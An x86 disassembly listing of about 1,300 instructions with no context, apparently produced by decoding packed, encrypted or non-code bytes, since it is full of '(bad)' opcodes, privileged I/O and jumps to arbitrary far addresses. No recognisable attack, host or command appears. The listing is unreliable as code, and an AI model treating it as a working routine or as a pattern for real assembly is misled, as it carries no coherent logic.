  41ffd2:	mov    ds:0x5647bad4,al
  41ffd7:	sar    BYTE PTR [ebp-0x1698b9e5],0xd6
  41ffde:	ja     0x41ffcc
  41ffe0:	cmp    eax,0x25b4e571
  41ffe5:	fcom   QWORD PTR [esi+0x4d]
  41ffe8:	push   cs
  41ffe9:	das    
  41ffea:	ret    0x47ba
  41ffed:	mov    WORD PTR [edi+ebp*8-0x68],fs
  41fff1:	rcr    esi,1
  41fff3:	loop   0x42006d
  41fff5:	push   0x50ee7377
  41fffa:	emms   
  41fffc:	push   esp
  41fffd:	jmp    0x5ae4:0x303cec7b
  420004:	mov    ah,0x77
  420006:	and    al,0xfd
  420008:	sub    bl,BYTE PTR [esi]
  42000a:	sbb    bl,BYTE PTR [edi-0x1]
  42000d:	pusha  
  42000e:	iret   
  42000f:	out    0x36,eax
  420011:	inc    ebp
  420012:	and    BYTE PTR [edi],ch
  420014:	sub    BYTE PTR [esi-0xe2b9fb7],ah
  42001a:	ins    DWORD PTR es:[edi],dx
  42001b:	into   
  42001c:	daa    
  42001d:	or     edx,DWORD PTR [eax+edi*1-0x32]
  420021:	push   edx
  420022:	test   DWORD PTR [eax+ebx*2+0x8],esi
  420026:	retf   0x97bf
  420029:	or     DWORD PTR [ecx],edx
  42002b:	bound  esp,QWORD PTR [ebx-0x1a]
  42002e:	jns    0x420095
  420030:	cmp    eax,0xa4ddd11f
  420035:	jno    0x420007
  420037:	imul   edx,DWORD PTR [eax+0x50da5b61],0xb0efa124
  420041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420042:	jnp    0x4200bd
  420044:	xchg   esi,eax
  420045:	cwde   
  420046:	das    
  420047:	add    BYTE PTR [edx],bh
  420049:	sbb    BYTE PTR [edx-0x6457a096],0xa2
  420050:	and    eax,DWORD PTR [esi+0x72]
  420053:	push   es
  420054:	jmp    0x420091
  420056:	sbb    al,0xff
  420058:	popf   
  420059:	mov    bl,BYTE PTR [eax-0x429c6fc1]
  42005f:	repnz loop 0x42005c
  420062:	daa    
  420063:	rcl    DWORD PTR [ebp-0x88cbc5],1
  420069:	js     0x41fff6
  42006b:	sbb    ebp,DWORD PTR [esi-0x343103b9]
  420071:	mov    ds,WORD PTR [eax+0x2f]
  420074:	push   eax
  420075:	mov    eax,ds:0x9e495a72
  42007a:	in     eax,dx
  42007b:	in     eax,0x6c
  42007d:	js     0x42000e
  42007f:	adc    DWORD PTR [esi+0x79c63612],eax
  420085:	jle    0x4200f0
  420087:	pop    edx
  420088:	pop    ss
  420089:	dec    edi
  42008a:	push   esi
  42008b:	bound  eax,QWORD PTR [ebx-0x73]
  42008e:	add    eax,0x4cabe47c
  420093:	mov    esi,0xfcb17365
  420098:	cmp    BYTE PTR [edx],0xf2
  42009b:	scas   eax,DWORD PTR es:[edi]
  42009c:	adc    ebx,DWORD PTR [edi-0x3]
  42009f:	pop    ebp
  4200a0:	jmp    0xec2d:0x3f140f51
  4200a7:	add    ebx,edx
  4200a9:	out    0xee,al
  4200ab:	lock in al,dx
  4200ad:	int    0x7
  4200af:	nop
  4200b0:	cdq    
  4200b1:	out    0xde,al
  4200b3:	das    
  4200b4:	push   esi
  4200b5:	iret   
  4200b6:	lods   eax,DWORD PTR ds:[esi]
  4200b7:	adc    BYTE PTR [eax-0xbeef3b5],ah
  4200bd:	sbb    BYTE PTR ds:0x158ac3ca,0xe5
  4200c4:	dec    esi
  4200c6:	add    al,0x97
  4200c8:	push   ecx
  4200c9:	inc    ebp
  4200ca:	aad    0xcb
  4200cc:	call   0x4fe:0xa18da926
  4200d3:	sbb    eax,0xb7d560cc
  4200d8:	xor    BYTE PTR [ebp+0x39f65d21],dl
  4200de:	mov    eax,ds:0xbfdd1484
  4200e3:	xchg   esi,eax
  4200e4:	leave  
  4200e5:	mov    edi,0xe95c8db5
  4200ea:	(bad)  
  4200eb:	imul   ebx,DWORD PTR [edi-0x792d5fd],0xffffff8d
  4200f2:	neg    al
  4200f4:	aas    
  4200f5:	xchg   ebp,eax
  4200f6:	lods   eax,DWORD PTR ds:[esi]
  4200f7:	or     BYTE PTR [esi-0x4467015c],bl
  4200fd:	ret    0x4670
  420100:	push   esp
  420101:	rcl    DWORD PTR [esi-0x78a9c54b],cl
  420107:	pop    ss
  420108:	rcl    BYTE PTR [ebp+edx*2+0x3e],cl
  42010c:	and    eax,0x5af003b3
  420111:	sbb    al,0x4b
  420113:	mov    dh,0xf5
  420115:	sub    DWORD PTR [edi-0x45bffc58],0xffffff87
  42011c:	push   ds
  42011d:	outs   dx,DWORD PTR ds:[esi]
  42011e:	jbe    0x420175
  420120:	push   ds
  420121:	sbb    BYTE PTR [eax-0x2a374ca6],0x22
  420128:	arpl   WORD PTR [ecx-0x6f],sp
  42012b:	jp     0x420103
  42012d:	stos   DWORD PTR es:[edi],eax
  42012e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42012f:	pop    ecx
  420130:	push   edx
  420131:	jae    0x4200d6
  420133:	cmp    bh,BYTE PTR [edi+0x3e]
  420136:	push   ebp
  420137:	mov    ebx,0xdf71955e
  42013d:	xchg   ebx,eax
  42013e:	inc    edx
  42013f:	add    eax,edx
  420141:	daa    
  420142:	int    0xad
  420144:	mov    ah,BYTE PTR [eax]
  420146:	mov    ds:0x45582dfc,al
  42014b:	outs   dx,BYTE PTR ds:[esi]
  42014c:	cli    
  42014d:	js     0x4200ea
  42014f:	mov    dh,0x5e
  420151:	test   BYTE PTR [esi+0x2b],0xe
  420155:	and    eax,0x1da2ad36
  42015a:	dec    esi
  42015b:	xor    eax,0xa3c30cf
  420160:	call   DWORD PTR [ebx]
  420162:	add    BYTE PTR [eax+edi*1],dl
  420165:	push   eax
  420166:	pop    edi
  420167:	and    BYTE PTR [ebx-0x15002860],cl
  42016d:	jg     0x420141
  42016f:	mov    edx,0x41f55d41
  420174:	add    dh,BYTE PTR [ebx+0x2181f714]
  42017a:	test   eax,0xd5649875
  42017f:	(bad)  
  420180:	sbb    DWORD PTR [eax+eiz*1-0x70fc5615],eax
  420187:	mov    al,ds:0xcaec77b
  42018c:	mov    dh,0xd0
  42018e:	std    
  42018f:	and    DWORD PTR [edx-0x85d1744],esp
  420195:	inc    ecx
  420196:	fst    DWORD PTR [ebx+eax*1+0x56]
  42019a:	sub    DWORD PTR [edx+0x5bed041],edx
  4201a0:	stc    
  4201a1:	fucomp st(7)
  4201a3:	pop    esp
  4201a4:	mov    esi,0x712eb7ae
  4201a9:	fdivr  DWORD PTR [eax+0x71]
  4201ac:	fs jge 0x8114b8cb
  4201b3:	dec    esp
  4201b4:	xchg   esp,eax
  4201b5:	ins    DWORD PTR es:[edi],dx
  4201b6:	xchg   esp,eax
  4201b7:	inc    ebp
  4201b8:	or     al,0xcf
  4201ba:	jmp    0xd3ec:0x217dd410
  4201c1:	push   ecx
  4201c2:	mov    cl,0xf2
  4201c4:	or     eax,0x47e7908d
  4201c9:	sbb    esp,DWORD PTR [ebp-0x7582e822]
  4201cf:	data16 mov al,ds:0x50186156
  4201d5:	xchg   esi,eax
  4201d6:	les    edi,FWORD PTR [edi+0x344ace12]
  4201dc:	repz mov ch,BYTE PTR ds:[edx+eiz*2]
  4201e1:	xor    DWORD PTR [edi+0x3],esi
  4201e4:	test   DWORD PTR [esi+ebp*4+0x5f0a893a],ebp
  4201eb:	into   
  4201ec:	or     BYTE PTR [edx],cl
  4201ee:	or     cl,BYTE PTR [eax]
  4201f0:	adc    al,BYTE PTR [edi-0x650ca9a0]
  4201f6:	adc    DWORD PTR [esi+0x1],ebp
  4201f9:	loop   0x4201ec
  4201fb:	jo     0x4201f9
  4201fd:	xchg   ebp,eax
  4201fe:	iret   
  4201ff:	push   es
  420200:	adc    DWORD PTR [ebx+edx*4-0x43],edx
  420204:	addr16 dec ebp
  420206:	xor    eax,0x80f9b779
  42020b:	call   0x42e2:0x83880c3b
  420212:	pop    esi
  420213:	scas   al,BYTE PTR es:[edi]
  420214:	bound  edi,QWORD PTR [ecx-0x6fd26cdd]
  42021a:	loope  0x42020b
  42021c:	scas   al,BYTE PTR es:[edi]
  42021d:	mov    BYTE PTR [edi-0x17bdd84],bh
  420223:	xor    ecx,DWORD PTR [ecx+eiz*2]
  420226:	ret    
  420227:	ins    DWORD PTR es:[edi],dx
  420228:	and    ah,BYTE PTR [eax+ebp*2-0x56824e5a]
  42022f:	jle    0x42029c
  420231:	mov    esi,0xdbfce75c
  420236:	dec    esi
  420237:	add    esp,edx
  420239:	fldcw  WORD PTR [ebx-0x8]
  42023c:	punpcklbw mm3,DWORD PTR [ebp-0x64]
  420240:	mov    edx,0x6d4cae96
  420245:	sub    eax,0xf99d38ff
  42024a:	es popa 
  42024c:	in     eax,dx
  42024d:	into   
  42024e:	(bad)  
  42024f:	mov    cl,0x5a
  420251:	fbld   TBYTE PTR [ebp+0x77]
  420254:	cmp    DWORD PTR [edi+0x3ddbe2a2],ebx
  42025a:	xchg   esi,eax
  42025b:	jae    0x420265
  42025d:	sub    DWORD PTR [eax],eax
  42025f:	push   eax
  420260:	mov    DWORD PTR [eax],ebx
  420262:	cmp    eax,0x2769da69
  420267:	xchg   ecx,eax
  420268:	(bad)  
  420269:	dec    edi
  42026a:	(bad)  
  42026b:	fimul  DWORD PTR [ebx+edx*4]
  42026e:	pop    ds
  42026f:	dec    esp
  420270:	sbb    eax,0x65482bb8
  420275:	addr16 leave 
  420277:	push   0x98527c30
  42027c:	dec    edx
  42027d:	cmp    eax,0x557d8a05
  420282:	mov    ds:0xc7ae30a5,eax
  420287:	test   eax,0xe5d34eed
  42028c:	cmp    cl,bl
  42028e:	adc    al,0x49
  420290:	outs   dx,DWORD PTR ds:[esi]
  420291:	pop    ss
  420292:	cmp    DWORD PTR [edx+0x3d56c0f1],ecx
  420298:	aaa    
  420299:	rcr    BYTE PTR [edi],0x86
  42029c:	cmp    DWORD PTR [edi-0x2d],0x6f
  4202a0:	es push cs
  4202a2:	mov    dh,0x4e
  4202a4:	or     eax,0x85322a02
  4202a9:	ficom  DWORD PTR ds:0xc87c18ae
  4202af:	frstor [edx+0x3]
  4202b2:	mov    edx,0x15a03aa2
  4202b7:	sti    
  4202b8:	jno    0x4202a9
  4202ba:	jb     0x420295
  4202bc:	hlt    
  4202bd:	jl     0x42032e
  4202bf:	iret   
  4202c0:	outs   dx,BYTE PTR ds:[esi]
  4202c1:	rcr    DWORD PTR [edi-0x48],0x9a
  4202c5:	adc    cl,BYTE PTR [eax-0x72]
  4202c8:	cmp    al,0xc7
  4202ca:	inc    eax
  4202cb:	jl     0x420262
  4202cd:	pop    esp
  4202ce:	add    esp,DWORD PTR [ebp-0x30]
  4202d1:	js     0x4202f7
  4202d3:	dec    edi
  4202d4:	inc    ebp
  4202d5:	mov    WORD PTR [edi+0x1d],ss
  4202d8:	out    dx,al
  4202d9:	push   ecx
  4202da:	mov    DWORD PTR [edx],esp
  4202dc:	sbb    al,0xdc
  4202de:	xchg   esi,eax
  4202df:	lods   eax,DWORD PTR ds:[esi]
  4202e0:	mov    dl,0xa6
  4202e2:	loope  0x42030a
  4202e4:	lds    edi,FWORD PTR [esi-0x7c42fa4e]
  4202ea:	ja     0x4202b1
  4202ec:	dec    ebp
  4202ed:	adc    dl,ah
  4202ef:	inc    edi
  4202f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202f1:	stc    
  4202f2:	jmp    0x42031f
  4202f4:	test   eax,0x5e17d9ab
  4202f9:	xor    eax,0x7acad8a5
  4202fe:	inc    ecx
  4202ff:	fwait
  420300:	iret   
  420301:	lds    esi,FWORD PTR [edx]
  420303:	jmp    0x3e9d7df7
  420308:	inc    edx
  420309:	jg     0x4202f9
  42030b:	gs xor eax,0x8c4826a4
  420311:	das    
  420312:	mov    ah,0xc5
  420314:	das    
  420315:	ins    DWORD PTR es:[edi],dx
  420316:	loop   0x420346
  420318:	add    dl,BYTE PTR [eax-0x38077dc9]
  42031e:	xor    BYTE PTR ds:0x6b2e50d7,bl
  420324:	(bad)  
  420325:	sbb    eax,0x4ce2b10a
  42032a:	ins    DWORD PTR es:[edi],dx
  42032b:	sub    BYTE PTR [edx+edx*2+0x76],ch
  42032f:	and    BYTE PTR [esi-0x4e],0xc
  420333:	mov    ch,0x46
  420335:	xchg   esi,eax
  420336:	leave  
  420337:	mov    ds:0x558ceba2,al
  42033c:	aas    
  42033d:	cmp    bh,BYTE PTR [edi+0x6d]
  420340:	inc    esp
  420341:	sbb    eax,0xef00d977
  420346:	mov    ebx,DWORD PTR [ecx+0x0]
  420349:	retf   0x7001
  42034c:	inc    edx
  42034d:	pushf  
  42034e:	lea    esi,[ecx+ecx*8]
  420351:	test   DWORD PTR [edx+0x2817fecf],edx
  420357:	xor    BYTE PTR [edx],0x82
  42035a:	push   eax
  42035b:	adc    eax,0x669a1680
  420360:	inc    esi
  420361:	dec    ebp
  420362:	test   DWORD PTR [eax-0x4677e660],esp
  420368:	pushw  0x47aa
  42036c:	cmp    eax,0xe087b400
  420371:	ins    DWORD PTR es:[edi],dx
  420372:	out    0x5,al
  420374:	aad    0xca
  420376:	add    eax,0x544078a2
  42037b:	icebp  
  42037c:	and    ebx,esi
  42037e:	xchg   esp,eax
  42037f:	cld    
  420380:	pop    esp
  420381:	pop    ebp
  420382:	(bad)  
  420383:	jecxz  0x4203df
  420385:	xchg   ebp,eax
  420386:	inc    esp
  420387:	xor    BYTE PTR [edx+0x3],dl
  42038a:	out    dx,eax
  42038b:	js     0x42033a
  42038d:	mov    dl,0xdb
  42038f:	ins    BYTE PTR es:[edi],dx
  420390:	and    bh,BYTE PTR [edx-0x7c9e1019]
  420396:	into   
  420397:	inc    ecx
  420398:	push   cs
  420399:	out    0x18,al
  42039b:	mov    ecx,ebx
  42039d:	xchg   ebx,eax
  42039e:	scas   eax,DWORD PTR es:[edi]
  42039f:	jns    0x42037c
  4203a1:	mov    bl,0xb0
  4203a3:	jl     0x4203c2
  4203a5:	rol    esi,1
  4203a7:	mov    dl,0xdb
  4203a9:	(bad)  [edi-0x7e]
  4203ac:	cli    
  4203ad:	sub    al,0xe5
  4203af:	pop    edx
  4203b0:	mov    al,BYTE PTR [eax]
  4203b2:	push   cs
  4203b3:	pause  
  4203b5:	push   esi
  4203b6:	xlat   BYTE PTR ds:[ebx]
  4203b7:	sub    ebx,DWORD PTR [ebx+0x31]
  4203ba:	xchg   ebx,eax
  4203bb:	xor    cl,BYTE PTR [edi]
  4203bd:	out    dx,eax
  4203be:	xor    DWORD PTR [edi],ecx
  4203c0:	inc    edx
  4203c1:	fs inc esi
  4203c3:	ror    DWORD PTR [edi+0x4d75bb62],1
  4203c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203ca:	fdiv   DWORD PTR [edx]
  4203cc:	fdiv   QWORD PTR [eax]
  4203ce:	xchg   ebp,eax
  4203cf:	pop    edx
  4203d0:	div    al
  4203d2:	pop    ds
  4203d3:	push   0x3b757dcb
  4203d8:	adc    BYTE PTR [edx-0x67],ch
  4203db:	pop    esp
  4203dc:	mov    ds:0x8405029c,al
  4203e1:	ss retf 
  4203e3:	jle    0x4203bb
  4203e5:	pop    ecx
  4203e6:	es test eax,0x129b332
  4203ec:	call   0xd2c3901f
  4203f1:	mov    ds:0x353b82bb,eax
  4203f6:	jmp    FWORD PTR [ecx+0x3b]
  4203f9:	xchg   ebp,eax
  4203fa:	(bad)  
  4203fb:	addr16 mov ebp,0x5dd94b7f
  420401:	(bad)  
  420402:	sub    ch,BYTE PTR [ecx-0x3bb331d9]
  420408:	fdivp  st(0),st
  42040b:	mov    edx,0x2ac29390
  420410:	popf   
  420411:	scas   eax,DWORD PTR es:[edi]
  420412:	clc    
  420413:	inc    ecx
  420414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420415:	pusha  
  420416:	and    ch,dl
  420418:	add    al,0x3a
  42041a:	jl     0x4203cf
  42041c:	out    dx,eax
  42041d:	dec    edi
  42041e:	inc    edi
  42041f:	xor    al,BYTE PTR ds:0xc1b1159a
  420425:	add    BYTE PTR [ebp-0xeb3365f],cl
  42042b:	dec    eax
  42042c:	adc    esi,DWORD PTR [esi]
  42042e:	(bad)  
  42042f:	lods   al,BYTE PTR ds:[esi]
  420431:	lea    ebx,[esi]
  420433:	out    0x82,al
  420435:	and    edi,DWORD PTR [edx+eax*8]
  420438:	lea    esp,[edx-0x4af3c7af]
  42043e:	push   ebx
  42043f:	jmp    0x2ff44e41
  420444:	icebp  
  420445:	sbb    dl,ch
  420447:	mov    al,0xcf
  420449:	pop    esp
  42044a:	std    
  42044b:	idiv   BYTE PTR [edx+0x3f3de12a]
  420451:	cmp    eax,DWORD PTR [esi+0x6a9d8254]
  420457:	test   ah,bl
  420459:	xchg   ecx,eax
  42045a:	jne    0x4204c3
  42045c:	mov    esi,0x8bfa8bf
  420461:	ins    BYTE PTR es:[edi],dx
  420462:	cwde   
  420463:	iret   
  420464:	xchg   esp,eax
  420465:	outs   dx,DWORD PTR ds:[esi]
  420466:	adc    eax,0x810271ac
  42046b:	cmp    al,0x55
  42046d:	les    edi,FWORD PTR [esi-0x70]
  420470:	std    
  420471:	ins    BYTE PTR es:[edi],dx
  420472:	adc    dl,ah
  420474:	cwde   
  420475:	dec    edi
  420476:	xchg   ebx,eax
  420477:	jmp    0x42044b
  420479:	(bad)  
  42047a:	dec    eax
  42047b:	out    dx,al
  42047c:	cmp    BYTE PTR [esp+ecx*4-0x43],bh
  420480:	shrd   DWORD PTR [esi],esi,cl
  420483:	shl    BYTE PTR [eax],0xde
  420486:	push   esp
  420487:	mov    ah,0xf7
  420489:	jae    0x420493
  42048b:	sub    edx,DWORD PTR [edi]
  42048d:	test   DWORD PTR [eax+0x30d9234f],ecx
  420493:	cmp    dl,BYTE PTR [edi-0x421ae7e0]
  420499:	sbb    eax,0xbf90467d
  42049e:	(bad)  
  42049f:	popf   
  4204a0:	outs   dx,DWORD PTR ds:[esi]
  4204a1:	sub    eax,0xf6ef26bd
  4204a6:	xor    DWORD PTR [ebp+0x4c984bec],ebx
  4204ac:	push   ebp
  4204ad:	stos   BYTE PTR es:[edi],al
  4204ae:	sbb    eax,0x316b16e
  4204b3:	push   eax
  4204b4:	mov    DWORD PTR [edi-0x4a],ecx
  4204b7:	into   
  4204b8:	jmp    0x3ed73f2a
  4204bd:	and    al,0x5
  4204bf:	shl    DWORD PTR es:[ecx],0xf7
  4204c3:	pop    ds
  4204c4:	adc    ebx,ecx
  4204c6:	ja     0x42044d
  4204c8:	in     eax,dx
  4204c9:	jl     0x420456
  4204cb:	xchg   ebx,eax
  4204cc:	sti    
  4204cd:	pushf  
  4204ce:	adc    eax,0xe0e6df0c
  4204d3:	add    al,0x27
  4204d5:	imul   esi,DWORD PTR [eax],0xcadab31c
  4204db:	(bad)  
  4204dc:	stos   DWORD PTR es:[edi],eax
  4204dd:	dec    ecx
  4204de:	xchg   DWORD PTR [edx+0x8],edx
  4204e1:	push   ebx
  4204e2:	and    eax,0x4106b4b6
  4204e7:	and    ch,0xca
  4204ea:	add    ah,al
  4204ec:	mov    ch,0xeb
  4204ee:	call   0x89d09e44
  4204f3:	jne    0x420571
  4204f5:	fsub   st,st(2)
  4204f7:	out    dx,al
  4204f8:	sub    esp,DWORD PTR [ebx+edx*2+0x5aa67555]
  4204ff:	xor    BYTE PTR [edx+0x1bdcfd51],dh
  420505:	stc    
  420506:	inc    ebp
  420507:	jmp    DWORD PTR [ecx+0x3d344718]
  42050d:	lock aaa 
  42050f:	in     al,0xbc
  420511:	pop    ss
  420512:	shl    BYTE PTR [ebp+0x184d3774],1
  420518:	repz dec esi
  42051a:	and    edi,DWORD PTR [edi-0x6a]
  42051d:	lds    ebp,FWORD PTR [edi]
  42051f:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  420521:	dec    esp
  420522:	xchg   esi,eax
  420523:	pop    esi
  420524:	jl     0x4204c3
  420526:	cmp    BYTE PTR [ebp+0x2571884f],dh
  42052c:	scas   eax,DWORD PTR es:[edi]
  42052d:	fsubr  QWORD PTR gs:[ebx+edx*4+0x28f64c4]
  420535:	cmp    esp,edx
  420537:	(bad)  
  420538:	repnz mov bh,0x42
  42053b:	xlat   BYTE PTR ds:[ebx]
  42053c:	mov    dl,0x2b
  42053e:	xchg   edx,eax
  42053f:	ins    BYTE PTR es:[edi],dx
  420540:	lods   al,BYTE PTR ds:[esi]
  420541:	imul   ebx,DWORD PTR [esi+0x48],0xffffff88
  420545:	pop    ds
  420546:	imul   esp,DWORD PTR [edi],0x291f18ce
  42054c:	jbe    0x420563
  42054e:	adc    bl,BYTE PTR [ecx+edi*4+0x18f9081a]
  420555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420556:	xchg   edx,eax
  420557:	ret    0x1b1d
  42055a:	jb     0x420597
  42055c:	(bad)  
  42055d:	and    eax,esi
  42055f:	les    ecx,FWORD PTR [eax-0x30]
  420562:	fild   QWORD PTR [ebp-0xf]
  420565:	into   
  420566:	mov    cl,0x69
  420568:	pushf  
  420569:	sbb    DWORD PTR [ecx+edi*4],esi
  42056c:	sbb    DWORD PTR [esi-0x34166df1],0x70
  420573:	(bad)  
  420575:	push   0x0
  420577:	or     cl,dh
  420579:	inc    esi
  42057a:	mov    esi,0x96a7a147
  42057f:	scas   eax,DWORD PTR es:[edi]
  420580:	into   
  420581:	pop    ds
  420582:	(bad)  
  420583:	adc    edi,DWORD PTR ds:0xa51de004
  420589:	lock jno 0x42059a
  42058c:	js     0x420553
  42058e:	call   0x41b4886d
  420593:	call   DWORD PTR [edx+0x2d]
  420596:	test   eax,0x7c15b890
  42059b:	test   eax,0x59e8cb30
  4205a0:	adc    DWORD PTR [esi-0x5fc81d40],edx
  4205a6:	in     eax,0x81
  4205a8:	and    DWORD PTR [ecx],ebp
  4205aa:	and    ebp,DWORD PTR [esi-0x6ca31663]
  4205b0:	and    BYTE PTR [ecx+0x67],bl
  4205b3:	ret    
  4205b4:	lock mov al,0xa3
  4205b7:	and    dl,BYTE PTR ds:[edx-0x7a8df798]
  4205be:	jg     0x420589
  4205c0:	(bad)  [ebx+eiz*4-0x409d5de7]
  4205c7:	nop
  4205c8:	and    esi,ebp
  4205ca:	mov    dl,0xfd
  4205cc:	xchg   DWORD PTR [edi+0x6c],edx
  4205cf:	xchg   esi,eax
  4205d0:	jg     0x4205d3
  4205d2:	(bad)  [ecx+0x49]
  4205d5:	mov    esi,0xa07b7f99
  4205da:	inc    esi
  4205db:	lods   eax,DWORD PTR ds:[esi]
  4205dc:	mov    WORD PTR [esi-0x2d0333e9],?
  4205e2:	and    eax,0xdb5bc23
  4205e7:	xchg   BYTE PTR [edx],bh
  4205e9:	icebp  
  4205ea:	adc    al,0x72
  4205ec:	and    eax,0xb339a136
  4205f1:	sub    eax,ebp
  4205f3:	(bad)  
  4205f4:	mov    eax,ds:0xa384ce71
  4205f9:	ja     0x4205df
  4205fb:	sub    BYTE PTR [ebx-0x1d],dl
  4205fe:	push   cs
  4205ff:	nop
  420600:	mov    ebp,0xcaae325b
  420605:	(bad)  
  420606:	xor    al,BYTE PTR [eax+0x140a9a2f]
  42060c:	and    esi,DWORD PTR [ecx]
  42060e:	inc    esi
  42060f:	arpl   WORD PTR [edi+ebx*1-0x6f],si
  420613:	sti    
  420614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420615:	ret    0xb9ad
  420618:	xchg   ecx,eax
  420619:	cmp    BYTE PTR [ecx-0x7e46993a],ah
  42061f:	sbb    al,0x2c
  420621:	and    al,0xb0
  420623:	es dec ebx
  420625:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  420627:	es xchg ebp,eax
  420629:	imul   ebx,DWORD PTR [esi],0x22
  42062c:	call   0x9980a516
  420631:	add    ecx,eax
  420633:	xchg   ebp,eax
  420634:	aam    0x7f
  420636:	xor    eax,0xf1a42b1
  42063b:	mov    bl,0x58
  42063d:	xchg   esp,eax
  42063e:	mov    ebx,0xadab34cd
  420643:	mov    bh,BYTE PTR [ecx+0x59]
  420646:	xor    DWORD PTR [edx+0x1a6e097f],ebp
  42064c:	(bad)  
  42064d:	out    0x4f,eax
  42064f:	into   
  420650:	inc    ecx
  420651:	dec    edi
  420652:	aas    
  420653:	nop
  420654:	add    DWORD PTR [edx],ebp
  420656:	addr16 gs xchg esi,eax
  420659:	mov    edi,0x250e20ad
  42065e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42065f:	push   ebx
  420660:	pop    ebx
  420661:	and    al,0xb2
  420663:	sub    al,0x5e
  420665:	loope  0x4206a3
  420667:	and    edi,DWORD PTR [edx-0x78e90c68]
  42066d:	xchg   ebp,ebp
  42066f:	imul   BYTE PTR [esi]
  420671:	mov    esp,0xff058cfa
  420676:	or     DWORD PTR [ebp+0x1030be11],0xffffffa2
  42067d:	sub    DWORD PTR [eax],ebx
  42067f:	ins    BYTE PTR es:[edi],dx
  420680:	sbb    eax,0x64b13f47
  420685:	dec    ecx
  420686:	adc    edx,DWORD PTR [ecx+0x71986fc6]
  42068c:	shl    BYTE PTR [ecx-0x2d],0x1d
  420690:	retf   0x90f3
  420693:	mov    ebp,0x4b70d8c8
  420698:	and    BYTE PTR fs:[eax+0x44],dl
  42069c:	out    0xac,eax
  42069e:	xchg   ecx,eax
  42069f:	out    dx,eax
  4206a0:	adc    eax,0x3d0a6d
  4206a5:	hlt    
  4206a6:	inc    ecx
  4206a7:	add    bl,ch
  4206a9:	lahf   
  4206aa:	push   ds
  4206ab:	shl    BYTE PTR ds:0x2618555d,0xfc
  4206b2:	mov    esp,0x955eca86
  4206b7:	(bad)  
  4206b8:	retf   0xb5f0
  4206bb:	aam    0x51
  4206bd:	pop    edx
  4206be:	xor    eax,0xeef7e4bb
  4206c3:	rcl    BYTE PTR [esp+ebp*4+0x76e65963],0xbe
  4206cb:	rcl    dl,1
  4206cd:	ficom  DWORD PTR [ebx]
  4206cf:	pop    ss
  4206d0:	mov    eax,ds:0x2676a2c5
  4206d5:	mov    ecx,0x548c977c
  4206da:	sub    eax,0x8614486b
  4206df:	lds    eax,FWORD PTR ds:0x44a52b43
  4206e5:	outs   dx,DWORD PTR ds:[esi]
  4206e6:	jmp    0xa8455a2d
  4206eb:	pop    ebx
  4206ec:	mov    WORD PTR [edx],cs
  4206ee:	enter  0x91da,0xb2
  4206f2:	dec    esi
  4206f3:	(bad)  
  4206f4:	pusha  
  4206f5:	jg     0x4206f1
  4206f7:	out    0xe9,al
  4206f9:	iret   
  4206fa:	pop    edi
  4206fb:	xor    al,0xb3
  4206fd:	jnp    0x42075e
  4206ff:	addr16 (bad) 
  420701:	(bad)  
  420702:	pop    esi
  420703:	xchg   DWORD PTR [edi+ecx*8+0x7a],ebp
  420707:	jl     0x420691
  420709:	mov    dh,0x32
  42070b:	dec    ecx
  42070c:	fist   WORD PTR [ecx-0x31]
  42070f:	enter  0x30ab,0xe3
  420713:	mov    ds:0xc715f679,al
  420718:	push   eax
  420719:	add    edx,DWORD PTR [eax+ebp*4-0x48]
  42071d:	push   0x43
  42071f:	mov    BYTE PTR [ebx-0x6b],ch
  420722:	arpl   WORD PTR [edi+eiz*8+0x1eed732e],ax
  420729:	adc    edx,eax
  42072b:	repnz fwait
  42072d:	mov    ebx,0x8f18b49b
  420732:	addr16 xchg edx,eax
  420734:	mov    edi,0xb3dc1477
  420739:	xchg   DWORD PTR [edx-0x172585e1],esi
  42073f:	add    dl,BYTE PTR [ebp-0x1e4d115]
  420745:	mov    cl,0xa4
  420747:	adc    ebx,eax
  420749:	or     bh,BYTE PTR [edi-0x17]
  42074c:	repz ficomp DWORD PTR [ebp+0x47]
  420750:	cli    
  420751:	pusha  
  420752:	dec    ecx
  420753:	or     eax,0x61f9f190
  420758:	popf   
  420759:	sbb    al,0x7e
  42075b:	xchg   BYTE PTR [edi+esi*2],dl
  42075e:	cmp    eax,0xcc1e6289
  420763:	call   0x11f4bb1e
  420768:	daa    
  420769:	push   ss
  42076a:	aad    0xe5
  42076c:	jbe    0x42078a
  42076e:	jg     0x4207bb
  420770:	push   es
  420771:	ror    DWORD PTR [ebx-0x1d0844fb],cl
  420777:	out    0x13,al
  420779:	push   ecx
  42077a:	fisub  WORD PTR [ecx+0xc8e858e]
  420780:	push   esp
  420781:	mov    al,0x14
  420783:	dec    ecx
  420784:	popa   
  420785:	add    BYTE PTR [eax-0x3a55e050],0x8
  42078c:	fld    st(2)
  42078e:	xchg   ecx,eax
  42078f:	push   edx
  420790:	dec    esp
  420791:	push   ss
  420792:	mov    ecx,0x7f2a8bf4
  420797:	shr    DWORD PTR [ecx],0x14
  42079a:	adc    eax,0xabfc3df3
  42079f:	lahf   
  4207a0:	jo     0x420776
  4207a2:	outs   dx,BYTE PTR ds:[esi]
  4207a3:	xchg   esp,eax
  4207a4:	aaa    
  4207a5:	mov    cl,dh
  4207a7:	add    al,BYTE PTR [ecx+0x56]
  4207aa:	sbb    edx,DWORD PTR [eax-0x16]
  4207ad:	fild   WORD PTR [ebx+0x6568fb3d]
  4207b3:	dec    ecx
  4207b4:	and    BYTE PTR [eax+0x1734b94e],al
  4207ba:	cmp    BYTE PTR [eax],bl
  4207bc:	sbb    eax,0x27decfd5
  4207c1:	sbb    bl,0xf3
  4207c4:	rol    BYTE PTR [esi-0x4f66c7d3],cl
  4207ca:	retf   
  4207cb:	mov    esp,0x18dc7743
  4207d0:	jbe    0x420762
  4207d2:	inc    esi
  4207d3:	sub    DWORD PTR [eax-0x47ca49c6],esp
  4207d9:	sub    eax,DWORD PTR cs:[esi]
  4207dc:	sbb    dx,WORD PTR [esi+0x4cc3cb5d]
  4207e3:	out    dx,eax
  4207e4:	cmc    
  4207e5:	(bad)
